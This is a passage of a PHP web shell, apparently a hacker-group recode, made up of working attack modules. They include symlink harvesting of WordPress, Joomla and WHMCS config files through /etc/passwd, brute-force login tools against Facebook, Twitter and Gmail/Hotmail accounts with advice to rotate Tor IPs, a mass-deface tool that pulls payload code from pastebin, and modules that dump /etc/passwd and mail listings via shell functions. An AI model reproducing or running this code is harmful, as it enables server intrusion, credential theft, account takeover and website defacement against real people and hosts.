                                                            fopen("test.txt","w");
                                                        fputs($file5,$temp);
                                                        fclose($file5);$dcount = 1;$file =
                                                            fopen("test.txt", "r") or exit("Unable to open file!");
                                                        while(!feof($file)){$s = fgets($file);$matches = array();
                                                            $t = preg_match('/\/(.*?)\:\//s', $s, $matches);$matches = str_replace("home/","",$matches[1]);
                                                            if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
                                                                continue;
                                                            echo "<tr><td align=center><font size=3>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
                                                            echo "<td align=center><font class=txt><a href=/k2/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
                                                            $dcount++;}
                                                        fclose($file);
                                                        echo "</table></div></center>";unlink("test.txt");
                                                    } else
                                                        echo "<center><font size=4>Cannot create Symlink</font></center>";
                                                    }
                                                }
                                            }




                                            /* Goblok
   start here */
                                            // domain viewer by S1r_V1ru5 rec0de by Sinkaroid ft Kerupuk
                                            elseif(isset($_GET['x']) && ($_GET['x'] == 'domainv')){ @ini_set('output_buffering',0);
                                            {
                                            ?>
                                            <form action="?y=<?php echo $pwd; ?>&x=dv" method="post">
                                                <center><h2>Domain Viewer by S1r_V1ru5 <br>rec0de by Sinkaroid ft Kerupuk<br>di colong by embuh cuk :v <br>notes: if blank(no domain) that mean not work use domain viewer, you can use symlink server</center><br><br>
                                                <?php
                                                function openBaseDir()
                                                {
                                                    $openBaseDir = ini_get("open_basedir");
                                                    if (!$openBaseDir)
                                                    {
                                                        $openBaseDir = '<font color="green">OFF</font>';
                                                    }
                                                    else
                                                    {
                                                        $openBaseDir = '<font color="red">ON</font>';
                                                    }
                                                    return $openBaseDir;
                                                }


                                                echo '
    <table width="95%" cellspacing="0" cellpadding="0" class="td1" >
    <td height="100" align="left" class="td1">';
                                                $pg = basename(__FILE__);
                                                $safe_mode = @ini_get('safe_mode');
                                                $dir = @getcwd();
                                                ////////////////////////////////////////////////////
                                                // LET'S PLAY ~
                                                ##.htaccess
                                                @mkdir('pee',0777);
                                                @symlink("/","pee/root");
                                                $htaccss = "Options all 
 DirectoryIndex Sux.html 
 AddType text/plain .php 
 AddHandler server-parsed .php 
  AddType text/plain .html 
 AddHandler txt .html 
 Require None 
 Satisfy Any";

                                                file_put_contents("pee/.htaccess",$htaccss);
                                                $etc = file_get_contents("/etc/passwd");
                                                $etcz = explode("\n",$etc);


                                                ##Symlink to the ROOT :p
                                                foreach($etcz as $etz){
                                                    $etcc = explode(":",$etz);
                                                    error_reporting(0);

                                                    $current_dir = posix_getcwd();
                                                    $dir = explode("/",$current_dir);

                                                    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/wp-config.php',"pee/".$etcc[0].'-WordPress.txt');
                                                    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/blog/wp-config.php',"pee/".$etcc[0].'-WordPress.txt');
                                                    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/wp/wp-config.php',"pee/".$etcc[0].'-WordPress.txt');
                                                    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/site/wp-config.php',"pee/".$etcc[0].'-WordPress.txt');
                                                    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/config.php',"pee/".$etcc[0].'-PhpBB.txt');
                                                    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/includes/config.php',"pee/".$etcc[0].'-vBulletin.txt');
                                                    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/configuration.php',"pee/".$etcc[0].'-Joomla.txt');
                                                    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/web/configuration.php',"pee/".$etcc[0].'-Joomla.txt');
                                                    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/joomla/configuration.php',"pee/".$etcc[0].'-Joomla.txt');
                                                    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/site/configuration.php',"pee/".$etcc[0].'-Joomla.txt');
                                                    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/conf_global.php',"pee/".$etcc[0].'-IPB.txt');
                                                    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/inc/config.php',"pee/".$etcc[0].'-MyBB.txt');
                                                    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/Settings.php',"pee/".$etcc[0].'-SMF.txt');
                                                    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/sites/default/settings.php',"pee/".$etcc[0].'-Drupal.txt');
                                                    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/e107_config.php',"pee/".$etcc[0].'-e107.txt');
                                                    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/datas/config.php',"pee/".$etcc[0].'-Seditio.txt');
                                                    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/includes/configure.php',"pee/".$etcc[0].'-osCommerce.txt');
                                                    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/client/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
                                                    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/clientes/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
                                                    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/support/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
                                                    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/supportes/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
                                                    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/whmcs/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
                                                    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/domain/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
                                                    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/hosting/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
                                                    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/whmc/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
                                                    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/billing/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
                                                    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/portal/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
                                                    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/order/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
                                                    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/clientarea/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
                                                    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/domains/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
                                                }
                                                #############################
                                                if(is_readable("/var/named")){
                                                    echo'<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4" class="td1">';
                                                    echo'<tr><td><center><b>SITE</b></center></td><td>
	<center><b>USER</b></center></td>
	<td></center><b>SYMLINK</b></center></td>';
                                                    $list = scandir("/var/named");
                                                    foreach($list as $domain){
                                                        if(strpos($domain,".db")){
                                                            $i += 1;
                                                            $domain = str_replace('.db','',$domain);
                                                            $owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));

                                                            echo "<tr><td class='td1'><a href='http://".$domain." '>".$domain."</a></td>
	<td class='td1'><center><font color='red'>".$owner['name']."</font></center></td>
	<td class='td1'><center><a href='pee/root".$owner['dir']."/".$dir[3]."' target='_blank'>DIR</a></center></td>";
                                                        }
                                                    }
                                                    echo "<center>Total Domains Found: ".$i."</center><br />";
                                                }else{
                                                    echo "<tr><td class='td1'>can't read [ /var/named ]</td><tr>"; }

                                                break;

                                                ##################################
                                                error_reporting(0);
                                                $etc = file_get_contents("/etc/passwd");
                                                $etcz = explode("\n",$etc);
                                                if(is_readable("/etc/passwd")){

                                                    echo'<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4" class="td1">';
                                                    echo'<tr><td><center><b>SITE</b></center></td><td><center><b>USER</b></center></td><td><center><b>SYMLINK</b></center></td>';

                                                    $list = scandir("/var/named");

                                                    foreach($etcz as $etz){
                                                        $etcc = explode(":",$etz);

                                                        foreach($list as $domain){
                                                            if(strpos($domain,".db")){
                                                                $domain = str_replace('.db','',$domain);
                                                                $owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
                                                                if($owner['name'] == $etcc[0])
                                                                {
                                                                    $i += 1;
                                                                    echo "<tr><td class='td1'><a href='http://".$domain." '>".$domain."</a></td><center>
<td class='td1'><font color='red'>".$owner['name']."</font></center></td>
<td class='td1'><center><a href='pee/root".$owner['dir']."/".$dir[3]."' target='_blank'>DIR</a></center></td>";
                                                                }}}}
                                                    echo "<center>Total Domains Found: ".$i."</center><br />";}

                                                break;
                                                ###############################
                                                if(is_readable("/etc/named.conf")){
                                                    echo'<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4" class="td1">';
                                                    echo'<tr><td><center><b>SITE</b></center></td><td><center><b>USER</b></center></td><td></center><b>SYMLINK</b></center></td>';
                                                    $named = file_get_contents("/etc/named.conf");
                                                    preg_match_all('%zone \"(.*)\" {%',$named,$domains);
                                                    foreach($domains[1] as $domain){
                                                        $domain = trim($domain);
                                                        $i += 1;
                                                        $owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
                                                        echo "<tr><td class='td1'><a href='http://".$domain." '>".$domain."</a></td><td class='td1'><center><font color='red'>".$owner['name']."</font></center></td><td class='td1'><center><a href='pee/root".$owner['dir']."/".$dir[3]."' target='_blank'>DIR</a></center></td>";
                                                    }
                                                    echo "<center>Total Domains Found: ".$i."</center><br />";

                                                } else { echo "<tr><td class='td1'>can't read [ /etc/named.conf ]</td></tr>"; }

                                                break;
                                                ############################
                                                if(is_readable("/etc/valiases")){
                                                    echo'<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4" class="td1">';
                                                    echo'<tr><td><center><b>SITE</b></center></td><td>
<center><b>USER</b></center></td><td></center>
<b>SYMLINK</b></center></td>';
                                                    $list = scandir("/etc/valiases");
                                                    foreach($list as $domain){
                                                        $i += 1;
                                                        $owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
                                                        echo "<tr><td class='td1'><a href='http://".$domain." '>".$domain."</a></td>
<center><td class='td1'><font color='red'>".$owner['name']."</font></center></td>
<td class='td1'><center><a href='pee/root".$owner['dir']."/".$dir[3]."' target='_blank'>DIR</a></center></td>";
                                                    }
                                                    echo "<center>Total Domains Found: ".$i."</center><br />";
                                                } else { echo "<tr><td class='td1'>can't read [ /etc/valiases ]</td></tr>"; }

                                                break;
                                                }}
                                                ##########################
                                                #Kerupuk X Sinkaroid
                                                ##########################################
                                                #######################
                                                ########################
                                                # JAAAAAAAAAAAAANCCCCCCCCCCCOOOOOOOOOOOOOK
                                                ##################
                                                # recode by Sinkaroid ft Kerupuk
                                                #########################
                                                #gue kasih skat biar ga pusing :v
                                                ##################################
                                                //////////////////
                                                ########################################################################
                                                ########################################################################
                                                #########################################################################
                                                # END
                                                ############## MYSQL ########################################
                                                //////////////////////////////////////////////////////////////////////////////

                                                elseif(isset($_GET['x']) && ($_GET['x'] == 'fbrute')){ @ini_set('output_buffering',0);
                                                ?>
                                                <form action="?y=<?php echo $pwd; ?>&x=fb" method="post">
                                                    <br><br><center><b><font size=4>-=Facebook BruteForce=-</font></b></center><br><br>
                                                    <?php
                                                    ob_start();
                                                    @set_time_limit(0);
                                                    #################################################
                                                    #---------------------------------------------- #
                                                    # Facebook Brute Force 2014                     #
                                                    # Coded by : Mauritania Attacker&Noname-Haxor   #
                                                    # Greetz : All AnonGhost Members                #
                                                    # WWW.HAURGEULIS-SECURITY.COM                   #
                                                    # --------------------------------------------- #
                                                    #################################################

                                                    echo "
<head>
<form method='POST'>
</head>";

                                                    echo "
<body text='white' bgcolor='black' >
<center></center>
<center>Gunakan ini dengan TOR BROWSER + TOR SWITCHER (ganti IP setiap 2 Menit Supaya Gak DIblok FB cok :v)</center>
<p dir='ltr' align='center'>
<textarea class='inputz' name='username' cols='42' rows='14'>Username Target Lu Cok</textarea>
<textarea class='inputz' name='password' cols='42' rows='14'>Wordlist Password Target Lu Cok</textarea><br>
<br>
<input class='inputzbut' type='submit' name='scan' value='Start BruteForce'><br></p>";
                                                    if(isset($_POST['scan'])){
#To Put Proxy SOCKS V5
//curl_setopt($ch, CURLOPT_PROXY, "proxy:port");
//curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
                                                        function brute($user,$pass){
                                                            $ch = curl_init();
                                                            curl_setopt($ch, CURLOPT_URL, "https://m.facebook.com/login.php?login_attempt=1");
                                                            curl_setopt($ch, CURLOPT_HEADER, 0);
                                                            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                                                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                                            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
                                                            curl_setopt($ch, CURLOPT_POSTFIELDS, "email={$user}&pass={$pass}");
                                                            curl_setopt($ch, CURLOPT_USERAGENT, "Chrome/36.0.1985.125");
                                                            $login = curl_exec($ch);
//print_r($login);
                                                            $check = (eregi('class="s t i u"',$login)) ? true:false;
                                                            if($check == true){
                                                                echo "<p align='center' dir='ltr'><font face='Arial Black' size='2'>Not the right one :(  || Username : <font color='red'>$user</font>&nbsp;  Password : <font color='red'>$pass</font></font></p>";
                                                            }else{
                                                                echo "<p align='center' dir='ltr'><font face='Arial Black' size='2'>This Password Seems Working !Try It ^_^ || Username: <font color='green'>$user</font>&nbsp; Password : <font color='green'>$pass</font></font></p>";
                                                            }
                                                        }



                                                        $username = explode("\n", $_POST['username']);
                                                        $password = explode("\n", $_POST['password']);
                                                        foreach($username as $users) {
                                                            $users = @trim($users);
                                                            foreach($password as $pass) {
                                                                $pass = @trim($pass);
                                                                echo brute($users,$pass);
                                                            }

                                                        }

                                                    }
                                                    echo"<br><br>";
                                                    }


                                                    ////////////////////////////////////////////////////////////////////////////
                                                    ///////////////////////////////////////////////////////////////////////////
                                                    elseif(isset($_GET['x']) && ($_GET['x'] == 'tbrute')){ @ini_set('output_buffering',0);
                                                    ?>
                                                    <form action="?y=<?php echo $pwd; ?>&x=tintin" method="post">
                                                        <br><br><center><b><font size=4>-=Twitter Multi-Account BruteForce=-</font></b></center><br>
                                                        <?php
                                                        echo "
<head>
<link rel='icon' type='image/ico' href='http://img1.wikia.nocookie.net/__cb20100818011300/lostpedia/images/f/f1/Twitter-icon.png'/>
<form method='POST'>
<title>Andela Yuwono Pacar Mr.HaurgeulisX196</title>
</head>
";
                                                        echo "<p dir='ltr' align='center'>
<textarea class='inputz' cols='42' class='area' rows='14' name='username'>Username</textarea> 
<textarea class='inputz' cols='42' class='area' rows='14' name='password'>Password</textarea><br><br><input type='submit' class='inputz' value='Attack Now'><br></p><br>";
                                                        if($_POST['username'] and $_POST['password']){
                                                            #function
                                                            function brute($user,$pass)
                                                            {
                                                                $ch = curl_init();
                                                                curl_setopt($ch, CURLOPT_URL, "https://twitter.com/intent/session/");
                                                                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                                                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                                                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                                                                curl_setopt($ch, CURLOPT_POSTFIELDS, "authenticity_token=&session[username_or_email]={$user}&session[password]={$pass}&remember_me=1");
                                                                curl_setopt($ch, CURLOPT_USERAGENT, "Chrome/34.0.1847.116"); #change with your real useragent plz

                                                                # cURL - Brute Users & Password
                                                                $login = curl_exec($ch);
                                                                if(eregi("error notice", $login)){


                                                                    echo "<p align='center' dir='ltr'><font face='Tahoma' size='2'>[+] : Username : <font color='red'>$user</font>&nbsp; Incorrect Password =====>: <font color='red'>$pass</font></font></p>";
                                                                }else{
                                                                    echo "<p align='center' dir='ltr'><font face='Tahoma' size='2'>[+] : [+] CRACKED SUCCESSFULLY [+]Username : <font color='green'>$user</font>&nbsp; GOOD PASSWORD =====>: <font color='green'>$pass</font></font></p>";
                                                                }
                                                            }
                                                            # POSTS
                                                            $username = explode("\n", $_POST['username']);
                                                            $password = explode("\n", $_POST['password']);

                                                            # Foreach Users N' Textarea
                                                            foreach($username as $users) {
                                                                $users = @trim($users);
                                                                foreach($password as $pass) {
                                                                    $pass = @trim($pass);
                                                                    brute($users,$pass); }}
                                                            # cURL

                                                        }
                                                        }
                                                        ////////////////////////////////////////////////////////////////////////////
                                                        elseif(isset($_GET['x']) && ($_GET['x'] == 'gbrute')){ @ini_set('output_buffering',0);
                                                        ?>
                                                        <form action="?y=<?php echo $pwd; ?>&x=syahrul" method="post">
                                                            <br><br><center><b><font size=4>-=Gmail & Hotmail BruteForce=-</font></b></center><br>
                                                            <center><center><br>
                                                                    <?php
                                                                    set_time_limit(0);
                                                                    error_reporting(0);

                                                                    class s1{

                                                                        private $adres = array(
                                                                            'gmail' => '{imap.gmail.com:993/imap/ssl}',
                                                                            'hotmail' => '{pop3.live.com:995/pop3/ssl}'
                                                                        );
                                                                        private $imap;
                                                                        function __construct($gelen1,$gelen2){

                                                                            $uname     = explode("\r\n",$gelen1);
                                                                            $pwd     = explode("\r\n",$gelen2);
                                                                            foreach($pwd as $pass){
                                                                                $pass = trim($pass);
                                                                                foreach($uname as $user){
                                                                                    $user = trim($user);

                                                                                    if(preg_match('@gmail@si',$user)){
                                                                                        $this->baglan($this->adres["gmail"],$user,$pass);
                                                                                    }else{
                                                                                        $this->baglan($this->adres["hotmail"],$user,$pass);
                                                                                    }
                                                                                }
                                                                            }
                                                                        }

                                                                        public function baglan($url,$user,$pass){

                                                                            $this->imap = imap_open($url,$user,$pass);
                                                                            if($this->imap){
                                                                                echo "<span id='cikti' >$user => $pass </span><br 

/>";
                                                                            }
                                                                        }
                                                                        function __destruct(){

                                                                            imap_close($this->imap);

                                                                        }
                                                                    }

                                                                    echo "
<head>
<link rel='icon' type='image/ico' href='http://www.hondupalmahn.com/imagenes/gmail.png'/>
<form method='POST'>
<title>Gmail Brute Force 2015</title>
</head>";

                                                                    echo '<br /> <center><div id="form"> 
<form id="form" method="POST" > 
<textarea class="inputz" cols="42" class="area" name="mail" rows="14" 

cols="28">Email Target Lu Disini Cok ^_^</textarea>  
<textarea class="inputz" cols="42" class="area" name="sifre" rows="14" 

cols="28">Password List Lu Disini Cok ^_^</textarea> <br /> <br />
<input class="inputz" type="submit" id="submit" value="Brute !" /> 
</form><br> 
</div> 
<div id="sonuc"> ';


                                                                    if($_POST){
                                                                        $mails = $_POST["mail"];
                                                                        $sifre = $_POST["sifre"];

                                                                        if((isset($mails)) and (isset($sifre))){
                                                                            $s1 = new s1($mails,$sifre);
                                                                        }
                                                                    }

                                                                    echo '</center></div> ';
                                                                    }



                                                                    /////////////////////////////////////////////////ancox///// ///////////////////////////////////////////////////////////////////////////////////////////////////////

                                                                    elseif(isset($_GET['x']) && ($_GET['x'] == 'sabun'))
                                                                    {
                                                                    ?>
                                                                    <center>
																	<STYLE>
textarea{background-color:#105700;color:lime;font-weight:bold;font-size: 11px;font-family: Tahoma; border: 1px solid #000000;}
input{FONT-WEIGHT:normal;background-color: #105700;font-size: 8px;font-weight:bold;color: lime; font-family: Tahoma; border: 
1px solid #666666;height:20}
body {
font-family: Tahoma
}
tr {
BORDER: dashed 1px #333;
color: #FFF;
}
td {
BORDER: dashed 1px #333;
color: #FFF;
}
.table1 {
BORDER: 0px Black;

BACKGROUND-COLOR: Black;

color: #FFF;

}

.td1 {

BORDER: 0px;

BORDER-COLOR: #333333;

font: 7pt Verdana;

color: Green;

}

.tr1 {

BORDER: 0px;

BORDER-COLOR: #333333;

color: #FFF;

}

table {

BORDER: dashed 1px #333;

BORDER-COLOR: #333333;

BACKGROUND-COLOR: Black;

color: #FFF;

}
h1{

font-family:Tahoma;

color:yellow;

}

input {

border			: dashed 1px;

border-color		: #333;

BACKGROUND-COLOR: Black;

font: 8pt Verdana;

color: Red;

}

select {

BORDER-RIGHT:  Black 1px solid;

BORDER-TOP:    #DF0000 1px solid;

BORDER-LEFT:   #DF0000 1px solid;

BORDER-BOTTOM: Black 1px solid;

BORDER-color: #FFF;

BACKGROUND-COLOR: Black;

font: 8pt Verdana;

color: Red;

}

submit {

BORDER:  buttonhighlight 2px outset;

BACKGROUND-COLOR: Black;

width: 30%;

color: #FFF;

}

textarea {

border			: dashed 1px #333;

BACKGROUND-COLOR: Black;

font: Fixedsys bold;

color: #999;

}
</style>
                                                                        <br>
                                                                        <center><div id="menu"><a href="?<?php echo "y=".$pwd; ?>&amp;x=sabun">Mass Deface v2.0</a>  <a href="?<?php echo "y=".$pwd; ?>&amp;x= deface2">Alternate Mass Deface</a>  <a href="?<?php echo "y=".$pwd; ?>&amp;x=mass">Mass Deface</a></center><br>
                                                                        <br><b><h1>-=[ Mass Deface By Sid Gifari ]=-</h1></b><br><br></b><br>
                                                                        <?php

                                                                        $Sid = file_get_contents("http://pastebin.com/raw/hDJyunfx");

echo "<center><form method='POST'>";
echo "<font color='gold'><b>Base Dir : </b></font><input type='text' name='base_dir' size='45' value='".getcwd ()."'><br><br>";
echo "<font color='yellow'><b>File Name :</b></font> <input type='text' name='file_name' value='index.php'><br><br>";
echo "<font color='aqua'><b>Index Code :</b></font> <br><br><textarea style='width: 785px; height: 500px;' name='index'>$Sid </textarea><br>";
echo "<input type='submit' value='Submit!'></form></center>";

if (isset ($_POST['base_dir']))
{
if (!file_exists ($_POST['base_dir']))
die ($_POST['base_dir']." Not Found !<br>");

if (!is_dir ($_POST['base_dir']))
die ($_POST['base_dir']." Is Not A Directory !<br>");

@chdir ($_POST['base_dir']) or die ("Cannot Open Directory");

$files = @scandir ($_POST['base_dir']) or die ("oohhh shet<br>");

foreach ($files as $file):
if ($file != "." && $file != ".." && @filetype ($file) == "dir")
{
$index = getcwd ()."/".$file."/".$_POST['file_name'];
if (file_put_contents ($index, $_POST['index']))
echo "$index&nbsp&nbsp&nbsp&nbsp<span style='color: green'>OK</span><br>";
}
endforeach;
}
                                                                        ?>
                                                                        <?php
                                                                        }



                                                                        /////////////////////////////////////////////////coeg///// /////////////////////////////
                                                                        elseif(isset($_GET['x']) && ($_GET['x'] == 'grasy'))
                                                                        {
                                                                            echo '<br><center><span style="font-size:30px; font-family:Tahoma, Geneva, sans-serif; color:#009900">Bypass /etc/passwd Priv8</span><center><br><br>';
                                                                            echo '<div class="tul"><font color="ee5500" face="Tahoma, Geneva, sans-serif" style="font-size: 8pt">


<p><center><font face="Tahoma" color="#007700" size="2pt">Bypass with System Function
<form method="post">
<input  class="inputzbut" type="submit" value="Bypass" name="syst">
</form>
</center>
</p>

<p><center>Bypass with Passthru Function
<form method="post">
<font face="Tahoma" color="#007700" size="2pt">
<input class="inputzbut"  type="submit" value="Bypass" name="passth">
</form>
</center><br>
</p>

<p><center><font face="Tahoma" color="#007700" size="2pt">Bypass with exec Function
<form method="post">
<input class="inputzbut"  type="submit" value="Bypass" name="ex">
</form>
</center><br>
</p>

<p><center><font face="Tahoma" color="#007700" size="2pt">Bypass with shell_exec Function
<form method="post">
<input class="inputzbut" type="submit" value="Bypass" name="shex">
</form>
</center><br>
</p>

<p><center><font face="Tahoma" color="#007700" size="2pt">Bypass with posix_getpwuid Function
<form method="post">
<input class="inputzbut" type="submit" value="Bypass" name="mauritania">
</form>
</center><br>
</p>

<center>';


//System Function //
                                                                            if($_POST['syst'])
                                                                            {

                                                                                echo"<textarea class='inputz' cols='65' rows='15'>";
                                                                                echo system("cat /etc/passwd");
                                                                                echo"</textarea><br>";
                                                                                echo"
<br>
<b>
</b>
<br>
";
                                                                            }
                                                                            echo '
</center>
<center>';



//Passthru Function //
                                                                            if($_POST['passth'])
                                                                            {
                                                                                echo"<textarea class='inputz' cols='65' rows='15'>";
                                                                                echo passthru("cat /etc/passwd");
                                                                                echo"</textarea><br>";
                                                                                echo"
<br>
<b>

</b>
<br>
";

                                                                            }


                                                                            echo '
</center>
<center>';



//exec Function //
                                                                            if($_POST['ex'])
                                                                            {
                                                                                echo"<textarea class='inputz' cols='65' rows='15'>";
                                                                                echo exec("cat /etc/passwd");
                                                                                echo"</textarea><br>";
                                                                                echo"
<br>
<b>
</b>
<br>
";
                                                                            }


                                                                            echo '
</center>
<center>';


//exec Function //
                                                                            if($_POST['shex'])
                                                                            {
                                                                                echo"<textarea class='inputz' cols='65' rows='15'>";
                                                                                echo shell_exec("cat /etc/passwd");
                                                                                echo"</textarea><br>";
                                                                                echo"
<br>
<b>
</b>
<br>
";
                                                                            }
                                                                            echo '</center>
<center>';



//posix_getpwuid Function //
                                                                            if($_POST['mauritania'])
                                                                            {
                                                                                echo"<textarea class='inputz' cols='65' rows='15'>";
                                                                                for($uid=0;$uid<60000;$uid++){
                                                                                    $ara = posix_getpwuid($uid);
                                                                                    if (!empty($ara)) {
                                                                                        while (list ($key, $val) = each($ara)){
                                                                                            print "$val:";
                                                                                        }
                                                                                        print "\n";
                                                                                    }
                                                                                }
                                                                                echo"</textarea><br>";
                                                                                echo"
<br>
<b>
</b>
<br>
";
                                                                            }
                                                                        }
                                                                        /////////////////////////////////////////////////coeg///// /////////////////////////////
                                                                        elseif(isset($_GET['x']) && ($_GET['x'] == 'nemcon'))
                                                                        {

                                                                            echo '<br><center><span style="font-size:30px; font-family:Tahoma, Geneva, sans-serif; color:#009900">Bypass Users Server Priv8</span><center><br><br>';
                                                                            echo '
<div ><font color="ee5500" face="Tahoma, Geneva, sans-serif" style="font-size: 8pt">

<p><center><font face="Tahoma" color="#007700" size="2pt">Bypass with awk program
<form method="post">
<input class="inputzbut" type="submit" value="Bypass" name="awk">
</form>
</center><br>
</p>



<p><center><font face="Tahoma" color="#007700" size="2pt">Bypass with System Function
<form method="post">
<input class="inputzbut"  type="submit" value="Bypass" name="syst">
</form>
</center><br>
</p>

<p><center><font face="Tahoma" color="#007700" size="2pt">Bypass with Passthru Function
<form method="post">
<input class="inputzbut"  type="submit" value="Bypass" name="passth">
</form>
</center><br>
</p>

<p><center><font face="Tahoma" color="#007700" size="2pt">Bypass with exec Function
<form method="post">
<input class="inputzbut"  type="submit" value="Bypass" name="ex">
</form>
</center><br>
</p>

<p><center><font face="Tahoma" color="#007700" size="2pt">Bypass with shell_exec Function
<form method="post">
<input class="inputzbut"  type="submit" value="Bypass" name="shex">
</form>
</center><br>
</p><center>';


//Awk Program //
                                                                            if ($_POST['awk']) {
                                                                                echo"<textarea class='inputzbut' cols='65' rows='15'>";
                                                                                echo shell_exec("awk -F: '{ print $1 }' /etc/passwd | sort");
                                                                                echo "</textarea><br>";
                                                                                echo "
<br>
<b>
</b>
<br>
";
                                                                            }
                                                                            echo "</center><center>";

//System Function //
                                                                            if ($_POST['syst']) {
                                                                                echo"<textarea class='inputzbut' cols='65' rows='15'>";
                                                                                echo system("ls /var/mail");
                                                                                echo "</textarea><br>";
                                                                                echo "
<br>
<b>
</b>
<br>
";
                                                                            }

                                                                            echo "</center><center>";

//Passthru Function //
                                                                            if ($_POST['passth']) {
                                                                                echo"<textarea class='inputzbut' cols='65' rows='15'>";
                                                                                echo passthru("ls /var/mail");
                                                                                echo "</textarea><br>";
                                                                                echo "
<br>
<b>
</b>
<br>
";
                                                                            }
                                                                            echo "</center><center>";

//exec Function //
                                                                            if ($_POST['ex']) {
                                                                                echo"<textarea class='inputzbut' cols='65' rows='15'>";
                                                                                echo exec("ls /var/mail");
                                                                                echo "</textarea><br>";
                                                                                echo "
<br>
<b>

</b>
<br>
";
                                                                            }

                                                                            echo "</center><center>";

//exec Function //
                                                                            if ($_POST['shex']) {
                                                                                echo"<textarea class='inputzbut' cols='65' rows='15'>";
                                                                                echo shell_exec("ls /var/mail");
                                                                                echo "</textarea><br>";
                                                                                echo "
<br>
<b>
</b>
<br>
";
                                                                            }
                                                                        }
                                                                        /////////////////////////////////////////////////coeg///// /////////////////////////////
                                                                        elseif(isset($_GET['x']) && ($_GET['x'] == 'cgipl'))
                                                                        {

                                                                            mkdir('cgipl', 0755);
                                                                            chdir('cgipl');
                                                                            $kokdosya = ".htaccess";
                                                                            $dosya_adi = "$kokdosya";
                                                                            $dosya = fopen ($dosya_adi , 'w') or die ("Dosya a&#231;&#305;lamad&#305;!");
                                                                            $metin = "AddType application/x-httpd-cgi .root 
AddType application/x-httpd-cgi .root 
AddHandler cgi-script .root 
AddHandler cgi-script .root";
                                                                            fwrite ( $dosya , $metin ) ;
                                                                            fclose ($dosya);
